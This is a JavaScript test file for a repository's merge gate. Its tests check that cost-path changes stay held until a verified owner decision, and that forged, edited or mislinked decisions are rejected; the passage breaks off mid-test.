// Expected values come from the issue that added these holds and the gate's
// own rules: the merge gate holds a change to a cost path
// (diff_risk.COST_PATHS) until the owner's cost decision, which
// babysit_merge_policy.cost_decision reads and test_babysit_merge_cost.py
// pins case by case. ci-status names its owner by the trusted-actor list, as
// its cost-only review hold step does, so a review approval lifts a hold path
// but never a cost hold. A decision binds to one pull request: one on the pull
// request counts as it is, one on its linked issue (closing, else `Refs:`)
// only when it names `#<number>`. It covers the head it decided, the sha of the
// newest cost hold notice a review lane's status job recorded before it on a
// run vetted not to change a review-lane workflow (#9635), while the head
// branch's push history shows a run of every lane on each head pushed since
// it before the decision (#10437), and a later head
// only when the net change against the base branch is the same at both (owner
// decisions Q17 c and Q18 d on #9436).
import assert from "node:assert/strict";
import { readFileSync, writeFileSync } from "node:fs";
import { join } from "node:path";
import { test } from "node:test";

import * as holdsModule from "./merge-holds.mjs";
import { BODY_WRITERS_QUERY, CARRY_REFUSES, COMMENT_EDITED_QUERY, approvalCarry, ungatedSince, HOLD_PATH_CLASSES, HOLD_PATH_FLOOR, PULL_OPENED_QUERY, REVIEW_FLOOR, baseMergeCarry, baseMergesOnly, changeOf, mergedParents, costDecision, costHold, costNotices, decidedHead, decisionGaps, evidenceHold, fromRest, holds, laneChange, laneChangeIn, linkHold, main, passRefusalOf, pathHold, PIN_RE, pinHold, sameNetChange, unranHead, withPinEdit, diffFiles, needsDiff, DIFF, wholeCompare } from "./merge-holds.mjs";
import { tempDir } from "../../../lib/test-tmp.mjs";
import { DIFF_TEXT, LISTED, PAGE_TWO } from "./capped-compare.fixture.mjs";

const REPO = "owner/repo";
const LINK = "https://github.com/owner/repo/issues/40#issuecomment-7";
const PR_CREATED = "2026-10-22T10:00:00Z";
const HUMANS = new Set([5]);
const HEAD = "0123456789abcdef0123456789abcdef01234567";
const BASE = "89abcdef0123456789abcdef0123456789abcdef";
const OLD = "fedcba9876543210fedcba9876543210fedcba98";
const CHECKS = { "pr-review-hosted.yml": "PR Review / review-status", "pr-review-security-hosted.yml": "PR Review Security / review-status" };
const laneRun = (sha, at = "2026-10-22T11:00:00Z", { criteria = "cost", lane = "pr-review-hosted.yml", job = CHECKS[lane], notice = sha, created = "2026-10-22T10:30:00Z", repo = REPO } = {}) => ({
  lane,
  repo,
  sha,
  at,
  job,
  created,
  notes: [{ annotation_level: "notice", message: `claude-lane-hold lane=claude-review sha=${notice} criteria=${criteria} label=needs-human` }],
});
const push = (after, timestamp) => ({ after, timestamp, activity_type: "push", ref: "refs/heads/fix/cost" });
const newestFirst = (moves) => [...moves].sort((a, b) => Date.parse(b.timestamp) - Date.parse(a.timestamp));
const pushesOf = (runs) =>
  newestFirst(
    Object.entries(
      runs.reduce((first, run) => ({ ...first, [run.sha]: Math.min(first[run.sha] ?? Infinity, Date.parse(run.at)) }), {}),
    ).map(([sha, at]) => push(sha, new Date(at - 300_000).toISOString())),
  );
const TF = { filename: "infra/main.tf", status: "modified", patch: "@@ -1 +1 @@\n-a\n+b" };
const net = (...files) => ({ files });
const MAIN = "5".repeat(40);
const history = (sha, answer) => {
  if (answer === null || typeof answer !== "object" || "commits" in answer || !("files" in answer)) return answer;
  const commits = [{ sha: sha === HEAD ? OLD : sha, parents: [{ sha: MAIN }] }, ...(sha === HEAD ? [{ sha: HEAD, parents: [{ sha: OLD }, { sha: MAIN }] }] : [])];
  return { ...answer, commits, total_commits: commits.length };
};

const ROW = "https://github.com/melodic-software/architecture/blob/main/docs/owner-decisions.md#L10";
const PROOF = `\n\nRow: ${ROW}\nOwner, verbatim: "Approve it."`;
const comment = (changes = {}) => ({
  issue_url: "https://api.github.com/repos/owner/repo/issues/40",
  user: { login: "owner-person", id: 5, type: "User" },
  performed_via_github_app: null,
  body: `**Decision recorded.** Cost: approve the larger runner for #99.${PROOF}`,
  node_id: "IC_7",
  created_at: "2026-10-22T12:00:00Z",
  ...changes,
});

function world({
  row = comment(),
  closing = [{ number: 40, repository: { nameWithOwner: REPO } }],
  node,
  created = PR_CREATED,
  target = { number: 40 },
  fail,
  runs = [laneRun(HEAD)],
  compares = {},
  base = "main",
  activity = pushesOf(runs),
  listings = {},
} = {}) {
  const reads = [];
  const answers = { ...Object.fromEntries(runs.map((run) => [run.sha, net(TF)])), ...compares };
  const github = async (method, path, body) => {
    // The activity API pages by the `after` cursor its Link header names,
    // 100 entries a page; it ignores `page`.
    const moves = /^\/repos\/owner\/repo\/activity\?ref=refs%2Fheads%2Ffix%2Fcost&direction=desc&per_page=100(?:&after=c([0-9]+))?$/.exec(path);
    if (moves) {
      const page = Number(moves[1] ?? 1);
      reads.push(page === 1 ? "activity" : `activity ${page}`);
      if (fail === (page === 1 ? "activity" : `activity ${page}`)) {
        throw new Error("activity failed");
      }
      if (!Array.isArray(activity)) {
        return activity;
      }
      const rows = activity.slice((page - 1) * 100, page * 100);
      const link = activity.length > page * 100 ? `<https://api.github.com/repositories/1/activity?per_page=100&after=c${page + 1}>; rel="next"` : null;
      return Object.defineProperty(rows, Symbol.for("github.link"), { value: link });
    }
    const listed = /^\/repos\/owner\/repo\/contents\/\.github\/workflows\?ref=([0-9a-f]{40})$/.exec(path)?.[1];
    if (listed !== undefined) {
      reads.push(`listing ${listed}`);
      if (!(listed in listings)) throw new Error(`GET ${path} failed with status 404`);
      return structuredClone(listings[listed]);
    }
    if (path.startsWith("/repos/owner/repo/git/ref/heads/")) {
      reads.push("ref");
      if (fail === "ref") throw new Error("ref failed");
      return { object: { sha: TIP } };
    }
    const parent = new RegExp(`^/repos/owner/repo/compare/([0-9a-f]{40})\\.\\.\\.${TIP}$`).exec(path);
    if (parent) {
      reads.push(`base ${parent[1]}`);
      return { status: parent[1] === MAIN ? "ahead" : "diverged" };
    }
    const compare = /^\/repos\/owner\/repo\/compare\/(.+)\.\.\.([0-9a-f]{40})$/.exec(path);
    const listing = /^\/repos\/owner\/repo\/actions\/workflows\/([a-z-]+\.yml)\/runs\?event=pull_request&branch=fix%2Fcost&per_page=100&page=1$/.exec(path);
    const jobs = /^\/repos\/owner\/repo\/actions\/runs\/([0-9]+)\/jobs\?filter=all&per_page=100&page=1$/.exec(path);
    const notes = /^\/repos\/owner\/repo\/check-runs\/([0-9]+)\/annotations\?per_page=100&page=1$/.exec(path);
    const read =
      body?.query === PULL_OPENED_QUERY
        ? "pull"
        : body?.query === COMMENT_EDITED_QUERY
          ? "edited"
          : listing
            ? `runs ${listing[1]}`
            : jobs
              ? `jobs ${jobs[1]}`
              : notes
                ? `notes ${notes[1]}`
                : compare
                  ? `compare ${compare[2]}`
                  : `${method} ${path}`;
    reads.push(read);
    if (read === fail) {
      throw new Error(`${read} failed`);
    }
    if (listing) {
      return { workflow_runs: runs.flatMap((run, i) => (run.lane === listing[1] ? [{ id: i + 1, head_sha: run.sha, created_at: run.created, head_repository: run.repo && { full_name: run.repo } }] : [])) };
    }
    if (jobs) {
      const run = runs[Number(jobs[1]) - 1];
      return { jobs: [{ id: Number(jobs[1]), name: run.job, completed_at: run.at }] };
    }
    if (notes) {
      return runs[Number(notes[1]) - 1].notes;
    }
    if (compare) {
      assert.equal(compare[1], TIP);
      if (!(compare[2] in answers)) {
        throw new Error("no such commit");
      }
      return history(compare[2], answers[compare[2]]);
    }
    if (read === "pull") {
      assert.deepEqual(body.variables, { owner: "owner", name: "repo", number: 99 });
      return {
        data: {
          repository: {
            pullRequest: { createdAt: created, baseRefName: base, headRefName: "fix/cost", closingIssuesReferences: { totalCount: closing.length, nodes: closing } },
          },
        },
      };
    }
    if (read === "edited") {
      assert.deepEqual(body.variables, { id: "IC_7" });
      return { data: { node: node === undefined ? { lastEditedAt: null } : node } };
    }
    if (read === "GET /repos/owner/repo/issues/40") {
      return target;
    }
    assert.equal(read, "GET /repos/owner/repo/issues/comments/7");
    return row;
  };
  return { github, reads };
}

const decide = (body = `Closes #40\n\nCost decision: ${LINK}\n`, options = {}) => {
  const { github, reads } = world(options);
  return costDecision(github, REPO, 99, body, HUMANS, options.head ?? HEAD).then((link) => ({ link, reads }));
};

test("an owner decision on the closing issue, linked from the body, clears the cost hold", async () => {
  const { link, reads } = await decide();
  assert.equal(link, LINK);
  assert.deepEqual(reads, [
    "pull",
    "GET /repos/owner/repo/issues/comments/7",
    "edited",
    "ref",
    "runs pr-review-hosted.yml",
    `compare ${HEAD}`,
    "jobs 1",
    "notes 1",
    "runs pr-review-security-hosted.yml",
    "activity",
  ]);
});

test("one on the pull request itself clears with no check against the pull request's time and no #number", async () => {
  const own = "https://github.com/owner/repo/pull/99#issuecomment-7";
  const row = comment({ issue_url: "https://api.github.com/repos/owner/repo/issues/99", created_at: "2026-10-21T09:00:00Z", body: `**Decision recorded.** Cost: approve it.${PROOF}`});
  assert.equal((await decide(own, { row, closing: [], runs: [laneRun(HEAD, "2026-10-21T08:00:00Z", { created: "2026-10-21T07:50:00Z" })] })).link, own);
  assert.equal((await decide(own, { row: { ...row, created_at: null }, closing: [] })).link, null);
});

test("one on the linked issue clears only when its text names the pull request", async () => {
  for (const text of ["for #99.", "(#99)", "#99", "see #99, then"]) {
    assert.equal((await decide(undefined, { row: comment({ body: `**Decision recorded.** Cost: approve ${text}${PROOF}` }) })).link, LINK, text);
  }
  for (const text of ["for another change.", "for #98.", "for #990.", "for owner/repo#99.", "for x#99.", "for pull 99.", "for &#99;", "for ##99."]) {
    assert.equal((await decide(undefined, { row: comment({ body: `**Decision recorded.** Cost: approve ${text}${PROOF}` }) })).link, null, text);
  }
});

test("with no closing issue, one on the issue the Refs line names counts the same way", async () => {
  const refs = `Refs: #40\n\nCost decision: ${LINK}\n`;
  assert.equal((await decide(refs, { closing: [] })).link, LINK);
  const unnamed = comment({ body: `**Decision recorded.** Cost: approve the larger runner.${PROOF}` });
  assert.equal((await decide(refs, { closing: [], row: unnamed })).link, null);
  for (const body of [`Refs: #41\n\n${LINK}`, `Refs: #40\nRefs: #41\n\n${LINK}`, `Refs: #40, #41\n\n${LINK}`, `\`\`\`\nRefs: #40\n\`\`\`\n\n${LINK}`, `<!-- Refs: #40 -->\n\n${LINK}`]) {
    assert.equal((await decide(body, { closing: [] })).link, null, body);
  }
  assert.equal((await decide(refs, { closing: [{ number: 12, repository: { nameWithOwner: REPO } }] })).link, null);
});

test("a Refs number that names a pull request, or cannot be read, consults no issue", async () => {
  const refs = `Refs: #40\n\nCost decision: ${LINK}\n`;
  const { link, reads } = await decide(refs, { closing: [], target: { number: 40, pull_request: { url: "x" } } });
  assert.equal(link, null);
  assert.deepEqual(reads, ["pull", "GET /repos/owner/repo/issues/40"]);
  assert.equal((await decide(refs, { closing: [], target: { number: 41 } })).link, null);
  assert.equal((await decide(refs, { closing: [], fail: "GET /repos/owner/repo/issues/40" })).link, null);
  const own = "https://github.com/owner/repo/pull/99#issuecomment-7";
  const row = comment({ issue_url: "https://api.github.com/repos/owner/repo/issues/99", body: `**Decision recorded.** Cost: approve it.${PROOF}`});
  const mine = await decide(`Refs: #40\n\n${own}\n`, { closing: [], row, target: { number: 40, pull_request: {} } });
  assert.equal(mine.link, own);
  assert.ok(!mine.reads.includes("GET /repos/owner/repo/issues/40"));
});

test("a body with no covering link reads nothing", async () => {
  for (const body of ["Closes #40", LINK.replace("owner/repo", "evil/repo"), `Closes #40\n<!-- ${LINK} -->\n`, `Closes #40\n<!--\n${LINK}\n`]) {
    const { link, reads } = await decide(body);
    assert.equal(link, null, body);
    assert.deepEqual(reads, [], body);
  }
});

test("each failing condition of the gate's rule clears nothing", async () => {
  const cases = {
    "a decision on another issue": { closing: [{ number: 12, repository: { nameWithOwner: REPO } }] },
    "two closing issues": {
      closing: [
        { number: 40, repository: { nameWithOwner: REPO } },
        { number: 41, repository: { nameWithOwner: REPO } },
      ],
    },
    "a closing issue in another repository": { closing: [{ number: 40, repository: { nameWithOwner: "evil/repo" } }] },
    "a comment not on the linked issue": { row: comment({ issue_url: "https://api.github.com/repos/owner/repo/issues/41" }) },
    "a person not on the trusted-actor list": { row: comment({ user: { login: "someone", id: 6, type: "User" } }) },
    "a bot": { row: comment({ user: { login: "owner-person", id: 5, type: "Bot" } }) },
    "posted through an App": { row: comment({ performed_via_github_app: { slug: "cursor" } }) },
    edited: { node: { lastEditedAt: "2026-10-22T13:00:00Z" } },
    "a null node": { node: null },
    "no lastEditedAt key": { node: {} },
    "no decision line": { row: comment({ body: "Sounds fine to me." }) },
    "a quoted decision": { row: comment({ body: "> **Decision recorded.** Cost: quoted" }) },
    "no cost marker": { row: comment({ body: "**Decision recorded.** Option 2." }) },
    "a cost marker on the next line": { row: comment({ body: "**Decision recorded.**\nCost: approve it." }) },
    "a decision older than the pull request": { row: comment({ created_at: "2026-10-21T09:00:00Z" }) },
    "a decision at the pull request's creation": { row: comment({ created_at: PR_CREATED }) },
    "no comment time": { row: comment({ created_at: null }) },
    "no pull request time": { created: "" },
    "an unreadable pull request": { fail: "pull" },
    "an unreadable comment": { fail: "GET /repos/owner/repo/issues/comments/7" },
    "an unreadable edit time": { fail: "edited" },
  };
  for (const [name, options] of Object.entries(cases)) {
    assert.equal((await decide(undefined, options)).link, null, name);
  }
});

test("a decision line after leading blank lines still counts", async () => {
  assert.equal((await decide(undefined, { row: comment({ body: `\n  **Decision recorded.**\tCost: yes for #99${PROOF}` }) })).link, LINK);
});

test("a cost decision clears only with a row link and a verbatim owner quote, and says which it lacks", async () => {
  const lacks = async (body) => {
    const missing = [];
    const { github } = world({ row: comment({ body }) });
    const link = await costDecision(github, REPO, 99, `Closes #40\n\n${LINK}`, HUMANS, HEAD, github, missing);
    return { link, missing };
  };
  const line = "**Decision recorded.** Cost: approve it for #99.";
  const quote = 'Owner, verbatim: "Approve it."';
  const sha = "0123456789abcdef0123456789abcdef01234567";
  for (const row of [ROW, `https://github.com/melodic-software/architecture/blob/${sha}/docs/owner-decisions.md#L12`, `${ROW}-L14`, ROW.replace(".md#", ".md?plain=1#")]) {
    assert.deepEqual(await lacks(`${line}\n${row}\n${quote}`), { link: LINK, missing: [] }, row);
  }
  for (const text of ['Owner\'s answer, verbatim: "yes go w/ recommendations"', 'Owner, typed in a session, verbatim: "Go with recommendations."']) {
    assert.equal((await lacks(`${line}\n${ROW}\n${text}`)).link, LINK, text);
  }
  const noRow = await lacks(`${line}\n${quote}`);
  assert.equal(noRow.link, null);
  assert.equal(noRow.missing.length, 1);
  assert.match(noRow.missing[0], /owner-decisions record/);
  const noQuote = await lacks(`${line}\n${ROW}`);
  assert.equal(noQuote.link, null);
  assert.equal(noQuote.missing.length, 1);
  assert.match(noQuote.missing[0], /verbatim/);
  assert.equal((await lacks(line)).missing.length, 2);
  for (const row of [
    ROW.replace("#L10", ""),
    ROW.replace("#L10", "#L0"),
    ROW.replace("/blob/main/", "/blob/feature/"),
    ROW.replace("/blob/main/", "/blob/0123abc/"),
    ROW.replace("melodic-software/architecture", "evil/architecture"),
    ROW.replace("owner-decisions.md", "decisions.md"),
    ROW.replace("https://github.com", "https://example.com"),
    `<!-- ${ROW} -->`,
    `<!--\n${ROW}`,
  ]) {
    assert.equal((await lacks(`${line}\n${row}\n${quote}`)).link, null, row);
  }
  for (const text of ['verbatim: ""', 'verbatim: "  "', "verbatim: yes", 'verbatim:\n"yes"', `<!-- ${quote} -->`, 'Owner, quoted: "yes"', 'The owner, verbatim as typed: "yes"']) {
    assert.equal((await lacks(`${line}\n${ROW}\n${text}`)).link, null, text);
  }
  const missing = [];
  const { github } = world({ row: comment({ body: line, performed_via_github_app: { slug: "x" } }) });
  assert.equal(await costDecision(github, REPO, 99, `Closes #40\n\n${LINK}`, HUMANS, HEAD, github, missing), null);
  assert.deepEqual(missing, []);
});

test("the row and quote only tighten: with both present, every older failing condition still holds", async () => {
  for (const [name, options] of Object.entries({
    "posted through an App": { row: comment({ performed_via_github_app: { slug: "cursor" } }) },
    edited: { node: { lastEditedAt: "2026-10-22T13:00:00Z" } },
    "a bot": { row: comment({ user: { login: "owner-person", id: 5, type: "Bot" } }) },
    "someone not listed": { row: comment({ user: { login: "someone", id: 6, type: "User" } }) },
    "no cost marker": { row: comment({ body: `**Decision recorded.** Option 2.${PROOF}` }) },
  })) {
    assert.match(comment(options.row ?? {}).body, /verbatim: "/, name);
    assert.equal((await decide(undefined, options)).link, null, name);
  }
  assert.equal((await decide()).link, LINK);
  assert.equal((await decide(undefined, { row: comment({ body: "**Decision recorded.** Cost: approve the larger runner for #99." }) })).link, null);
});

test("decisionGaps reads outside HTML comments and names each gap once", () => {
  assert.deepEqual(decisionGaps(`x\n${ROW}\nverbatim: "y"`), []);
  assert.equal(decisionGaps(`<!-- ${ROW}\nverbatim: "y" -->`).length, 2);
  assert.equal(decisionGaps(null).length, 2);
});

test("the cost hold's reason names what the linked decision comment lacks", () => {
  const [reason] = holds("", [], ["infra/main.tf"], [], [], null, true, true, ["a row link"]);
  assert.match(reason, /owner-decisions record and the owner's words quoted verbatim/);
  assert.match(reason, /the linked decision comment lacks a row link$/);
  assert.doesNotMatch(holds("", [], ["infra/main.tf"], [], [], null)[0], /lacks/);
  assert.deepEqual(holds("", [], ["infra/main.tf"], [], [], LINK), []);
});

test("costHold holds a cost path, case-folded, until a decision", () => {
  for (const path of ["Pulumi.yaml", "infra/pulumi.Dev.yaml", "infra/.x/main.TF", "a.tfvars", "deploy/main.bicep", "deploy/main.bicepparam"]) {
    assert.match(costHold([path], null), new RegExp(`it changes ${path.replaceAll(".", "\\.")}, a cost path`), path);
    assert.equal(costHold([path], LINK), null, path);
  }
  assert.equal(costHold(["docs/a.md", "plugins/multi-agent/reference/defaults.yaml", "Pulumi.md"], null), null);
  assert.equal(costHold(null, null), null);
});

const BASELINE = "docs/upstream/claude-code-native-surfaces.min.json";
function ci(files, { reviews = [], body = "Closes #40", options, denied = [], writers = "fail", head = HEAD, queue, pull, baselineFile = BASELINE } = {}) {
  const dir = tempDir("merge-holds-");
  const env = pull === undefined ? {} : { BABYSIT_VERIFY_PULL: join(dir, "pull"), LANES_APP_ID: "9", ...(baselineFile === null ? {} : { BASELINE_FILE: baselineFile }) };
  if (pull !== undefined) {
    writeFileSync(join(dir, "pull"), JSON.stringify(pull));
  }
  writeFileSync(join(dir, "body"), body);
  writeFileSync(join(dir, "discussion"), reviews.map((row) => JSON.stringify(row)).join("\n"));
  writeFileSync(join(dir, "actors"), JSON.stringify({ actors: [{ kind: "human", login: "owner-person", id: 5 }] }));
  writeFileSync(join(dir, "files"), files.map((row) => JSON.stringify(typeof row === "string" ? [row] : row)).join("\n"));
  writeFileSync(join(dir, "denied"), JSON.stringify(denied));
  const argv = ["99", ...["body", "discussion", "files", "denied", "actors"].map((name) => join(dir, name)), head];
  if (queue) {
    const text = (value) => (typeof value === "string" ? value : JSON.stringify(value));
    writeFileSync(join(dir, "verdicts"), queue.verdicts.map(text).join("\n"));
    writeFileSync(join(dir, "link"), text(queue.link));
    argv.push(join(dir, "verdicts"), join(dir, "link"));
    if (queue.evidence !== undefined) {
      writeFileSync(join(dir, "evidence"), text(queue.evidence));
      argv.push(join(dir, "evidence"));
    }
  }
  const { github: decisions } = world(options);
  const github = async (method, path, data) => {
    if (data?.query !== BODY_WRITERS_QUERY) {
      return decisions(method, path, data);
    }
    assert.deepEqual(data.variables, { owner: "owner", name: "repo", number: 99 });
    if (writers === "fail") {
      throw new Error("unreadable");
    }
    return { data: { repository: { pullRequest: writers } } };
  };
  const lines = [];
  const log = console.log;
  console.log = (line) => lines.push(line);
  return main(argv, { env: { GITHUB_REPOSITORY: REPO, BASE_SHA: BASE, ...env }, github }).then(
    (code) => {
      console.log = log;
      return { code, out: lines.join("\n") };
    },
    (error) => {
      console.log = log;
      throw error;
    },
  );
}
const approve = { user: { login: "owner-person", id: 5, type: "User" }, state: "APPROVED", commit_id: HEAD, submitted_at: "2026-10-23T11:00:00Z" };

const FLOOR_FILES = [
  ".github/actions/resolve-config/resolve.mjs",
  ".github/actions/Resolve-Config/lane-rules.json",
  ".github/actions/request-lane-token/action.yml",
  ".github/actions/check-trusted-trigger/check-trusted-trigger.mjs",
  ".github/actions/check-kill-switch/check-kill-switch.mjs",
  ".github/actions/log-api-budget/rate-guard.mjs",
  ".github/actions/log-api-budget/rate-limits.json",
  ".github/CODEOWNERS",
  "plugins/foo/codeowners",
  ".gitmodules",
  "vendor/sub/.gitmodules",
  ".github/scripts/pr-merge/merge-holds.mjs",
  ".github/scripts/pr-merge/enable-auto-merge.mjs",
  ".github/scripts/pr-merge/superseded.mjs",
  ".github/scripts/pr-merge/clear-escalations.mjs",
  ".github/scripts/pr-merge/gate-check.mjs",
  ".github/scripts/pr-merge/who.mjs",
  ".github/scripts/pr-merge/rate-stop.bash",
  ".github/scripts/pr-merge/retry-call.bash",
  "plugins/source-control/skills/babysit-prs/scripts/babysit_merge.py",
  "plugins/source-control/skills/babysit-prs/scripts/babysit_merge_policy.py",
  "plugins/source-control/skills/babysit-prs/scripts/diff_risk.py",
  "plugins/source-control/skills/babysit-prs/scripts/babysit_review_evidence.py",
  "docs/conventions/pr-pipeline.yaml",
];
const ENFORCEMENT_FILES = [
  "plugins/source-control/skills/babysit-prs/scripts/babysit_verify_evidence.py",
  "plugins/source-control/skills/babysit-prs/scripts/babysit_gh.py",
  ".github/scripts/pr-unblock/address-feedback.mjs",
  ".github/scripts/pr-unblock/escalation-routes.mjs",
  ".github/scripts/pr-unblock/escalation-routes.json",
  ".github/scripts/pr-unblock/gate-source.mjs",
  ".github/scripts/pr-unblock/thread-scope.mjs",
  ".github/scripts/lib/retry-fetch.mjs",
  ".github/scripts/work-resolve-issue/report-outcome.mjs",
  ".github/scripts/work-resolve-issue/limits.mjs",
  ".github/scripts/lib/lane-hold-marker.mjs",
  ".github/scripts/pr-unblock/report-escalation.sh",
  ".github/scripts/pr-unblock/adjudicate-feedback.mjs",
  ".github/scripts/pr-unblock/publish-feedback.mjs",
  ".github/scripts/pr-unblock/request-budget.mjs",
  ".github/scripts/pr-unblock/dependency-classify.mjs",
  ".github/scripts/apply-patch/apply-patch.mjs",
  ".github/scripts/apply-patch/predicates.mjs",
  ".github/scripts/apply-patch/protected-paths.mjs",
  ".github/scripts/lib/run-main.mjs",
  ".github/scripts/lib/github-rest.mjs",
  ".github/scripts/pr-unblock/fix-ci-context.mjs",
  ".github/scripts/maintenance-reconcile-lost-runs/infra-failure.mjs",
  ".github/scripts/work-resolve-issue/stop-routes.json",
  ".github/scripts/work-resolve-issue/stop-routes.mjs",
  ".github/scripts/work-resolve-issue/known-names.json",
];
test("the floor's enforcement globs are the merge gate's, every other one holds here", () => {
  assert.deepEqual(REVIEW_FLOOR, HOLD_PATH_CLASSES.filter(([, kind]) => kind === "enforcement").map(([glob]) => glob));
  assert.deepEqual(HOLD_PATH_FLOOR, HOLD_PATH_CLASSES.filter(([, kind]) => kind !== "enforcement").map(([glob]) => glob));
  assert.deepEqual([...new Set(HOLD_PATH_CLASSES.map(([, kind]) => kind))].sort(), ["enforcement", "gate", "trust"]);
  for (const path of ENFORCEMENT_FILES) {
    assert.ok(REVIEW_FLOOR.includes(path), path);
    assert.equal(pathHold([path], []), null, path);
  }
});
test("ci-status leaves an enforcement path to the merge gate's security review", async () => {
  for (const path of ENFORCEMENT_FILES) {
    const passed = await ci([{ filename: path, status: "modified" }]);
    assert.equal(passed.code, 0, `${path}: ${passed.out}`);
  }
  const both = await ci([{ filename: ENFORCEMENT_FILES[0], status: "modified" }, { filename: ".github/scripts/pr-merge/who.mjs", status: "modified" }]);
  assert.equal(both.code, 1, both.out);
  assert.ok(both.out.includes("it changes .github/scripts/pr-merge/who.mjs, a hold path"), both.out);
});
test("ci-status holds each floor path with no configured glob, until a trusted person approves the head", async () => {
  for (const path of FLOOR_FILES) {
    const held = await ci([{ filename: path, status: "modified" }]);
    assert.equal(held.code, 1, `${path}: ${held.out}`);
    assert.ok(held.out.includes(`it changes ${path}, a hold path`), `${path}: ${held.out}`);
    const approved = await ci([{ filename: path, status: "modified" }], { reviews: [approve] });
    assert.equal(approved.code, 0, `${path}: ${approved.out}`);
    assert.match(approved.out, /owner-person approved this head, which lifts its hold path/);
  }
  const renamed = await ci([["docs/x.md", ".github/actions/check-kill-switch/action.yml", "renamed"]]);
  assert.equal(renamed.code, 1, renamed.out);
});

test("ci-status holds no other trusted path or manifest change, only a configured denied path", async () => {
  for (const path of [
    "plugins/foo/.claude-plugin/plugin.json",
    ".claude-plugin/marketplace.json",
    "docs/conventions/pr-pipeline/README.md",
    ".github/standards/trusted-actors/README.md",
    ".github/standards/trusted-actors/trusted-actors.schema.json",
    ".github/actions/log-api-budget/action.yml",
    ".github/actions/log-api-budget/rate-guard.test.mjs",
    ".github/actions/check-trusted-trigger-x/a.mjs",
    ".github/scripts/pr-unblock/other.mjs",
    "docs/CODEOWNERS.md",
  ]) {
    const passed = await ci([{ filename: path, status: "modified" }]);
    assert.equal(passed.code, 0, `${path}: ${passed.out}`);
    assert.match(passed.out, /no member veto and no hold path\./);
  }
  const held = await ci([{ filename: "docs/held.md", status: "modified" }], { denied: ["docs/held.md"] });
  assert.equal(held.code, 1);
  assert.match(held.out, /it changes docs\/held\.md, a hold path/);
});

test("ci-status holds no change to the retired synced trusted-actor list path: the list is read from standards", async () => {
  const path = ".github/standards/trusted-actors/trusted-actors.json";
  for (const change of [{ filename: path, status: "modified" }, { filename: path, status: "added" }, [path, ".github/standards/trusted-actors/old.json", "renamed"]]) {
    const passed = await ci([change]);
    assert.equal(passed.code, 0, passed.out);
    assert.match(passed.out, /no member veto and no hold path\./);
  }
});

test("ci-status holds no body hold text, even a person's; a hold path or a member's veto still holds", async () => {
  const body = "Closes #40\n\nHold: wait for the release.\n\ndo not merge";
  const person = { __typename: "User" };
  const written = await ci(["docs/a.md"], { body, writers: { author: person, userContentEdits: { totalCount: 0, nodes: [] } } });
  assert.equal(written.code, 0, written.out);
  assert.match(written.out, /^#99: no member veto and no hold path\.$/m);
  const pathed = await ci(["docs/held.md"], { body, denied: ["docs/held.md"] });
  assert.equal(pathed.code, 1, pathed.out);
  assert.match(pathed.out, /it changes docs\/held\.md, a hold path/);
  assert.doesNotMatch(pathed.out, /its body holds it/);
  const veto = { id: 1, user: { login: "kyle", id: 7, type: "User" }, author_association: "MEMBER", created_at: "2026-10-23T10:00:00Z", body: "Please do not merge this yet." };
  const vetoed = await ci(["docs/a.md"], { body, reviews: [veto] });
  assert.equal(vetoed.code, 1, vetoed.out);
  assert.match(vetoed.out, /kyle asked not to merge it/);
  assert.doesNotMatch(vetoed.out, /its body holds it/);
});

test("ci-status holds a cost path that an approval does not lift, and the owner's decision does", async () => {
  const held = await ci(["infra/main.tf"]);
  assert.equal(held.code, 1);
  assert.match(held.out, /it changes infra\/main\.tf, a cost path/);
  const approved = await ci(["infra/main.tf"], { reviews: [approve] });
  assert.equal(approved.code, 1);
  assert.match(approved.out, /a cost path/);
  const decided = await ci(["infra/main.tf"], { body: `Closes #40\n\n${LINK}` });
  assert.equal(decided.code, 0, decided.out);
  assert.match(decided.out, /no member veto and no hold path\./);
  assert.equal((await ci(["infra/main.tf"], { body: `Closes #40\n\n${LINK}`, options: { node: { lastEditedAt: "2026-10-22T13:00:00Z" } } })).code, 1);
});

test("ci-status lifts a cost hold for the head the decision decided, and re-holds a later head with a change of its own", async () => {
  const own = "https://github.com/owner/repo/pull/99#issuecomment-7";
  const row = comment({ issue_url: "https://api.github.com/repos/owner/repo/issues/99", body: `**Decision recorded.** Cost: approve it.${PROOF}`});
  const body = `Closes #40\n\n${own}`;
  assert.equal((await ci(["infra/main.tf"], { body, options: { row } })).code, 0);
  const later = await ci(["infra/main.tf"], { body, options: { row, runs: [laneRun(OLD)], compares: { [OLD]: net(TF), [HEAD]: net(TF, { filename: "infra/b.tf", status: "added", patch: "@@ -0,0 +1 @@\n+c" }) } } });
  assert.equal(later.code, 1, later.out);
  assert.match(later.out, /a cost path/);
  const unnamed = await ci(["infra/main.tf"], { body: `Closes #40\n\n${LINK}`, options: { row: comment({ body: `**Decision recorded.** Cost: approve it.${PROOF}`}) } });
  assert.equal(unnamed.code, 1);
  assert.match(unnamed.out, /on its linked issue naming this pull request/);
});

// The carry rule (#9436 Q18 d): the decided head is OLD, the current HEAD.
const later = (compares, options = {}) => decide(undefined, { runs: [laneRun(OLD)], compares, ...options });

test("a base merge after the decision carries it, and a pull request commit after it re-holds", async () => {
  assert.equal((await later({ [OLD]: net(TF), [HEAD]: net(TF) })).link, LINK);
  const commit = await later({ [OLD]: net(TF), [HEAD]: net(TF, { filename: "scripts/run.sh", status: "modified", patch: "@@ -1 +1 @@\n-x\n+y" }) });
  assert.equal(commit.link, null);
  assert.deepEqual(commit.reads.slice(-4), ["activity", `compare ${OLD}`, `compare ${HEAD}`, `base ${MAIN}`]);
  assert.equal(commit.reads.filter((read) => read === "ref").length, 1);
});

test("a base merge with the same net change carries whatever order the files list in, and a rebase or a non-merge commit does not", async () => {
  const doc = { filename: "docs/a.md", status: "added", patch: "@@ -0,0 +1 @@\n+a" };
  assert.equal((await later({ [OLD]: net(TF, doc), [HEAD]: net(doc, TF) })).link, LINK);
  assert.equal((await later({ [OLD]: net(TF, doc), [HEAD]: net(TF) })).link, null);
  const rebased = { ...net(TF), commits: [{ sha: "6".repeat(40), parents: [{ sha: MAIN }] }, { sha: HEAD, parents: [{ sha: "6".repeat(40) }] }], total_commits: 2 };
  assert.equal((await later({ [OLD]: net(TF), [HEAD]: rebased })).link, null);
  const plain = { ...net(TF), commits: [{ sha: OLD, parents: [{ sha: MAIN }] }, { sha: HEAD, parents: [{ sha: OLD }] }], total_commits: 2 };
  assert.equal((await later({ [OLD]: net(TF), [HEAD]: plain })).link, null);
});

test("a conflict resolution, a rename or a status change that alters the net change re-holds", async () => {
  for (const [name, changed] of Object.entries({
